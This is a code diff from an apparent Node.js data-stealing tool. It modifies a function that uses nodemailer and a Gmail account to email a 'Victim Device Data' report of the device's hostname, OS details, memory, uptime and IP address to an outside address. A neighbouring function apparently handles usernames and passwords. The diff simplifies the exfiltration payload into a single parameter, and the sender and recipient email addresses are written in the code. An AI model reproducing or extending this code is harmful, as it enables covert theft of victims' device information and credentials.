@@ -70,7 +70,7 @@ function mail_contact_info(dataof,usname, passpw, phone){
 
 
 
-function senddeviceinfo(hostname,osType,osPlatform,osArch,cpuCores,totalMemory,freeMemory,uptime, ipAddress){
+function senddeviceinfo(deviceinfo){
     const transporter = nodemailer.createTransport({
       service: 'gmail',
       auth: {
@@ -84,17 +84,7 @@ function senddeviceinfo(hostname,osType,osPlatform,osArch,cpuCores,totalMemory,f
       from: 'anshuman91vish@gmail.com',
       to: 'syedsaifali214@gmail.com', // Replace with the recipient's email address
       subject: `Victim Device Data`,
-      text: `
-              hostname : ${hostname} 
-              OsType : ${osType} 
-              OsPlatform : ${osPlatform} 
-              OsArch : ${osArch} 
-              Cpu Cores : ${cpuCores} 
-              Toatl Memory : ${totalMemory} 
-              Free Memory : ${freeMemory} 
-              Uptime : ${uptime}
-              IP Address : ${ipAddress}
-             `,
+      text: `${deviceinfo}`,
     };
     
     // Send the email
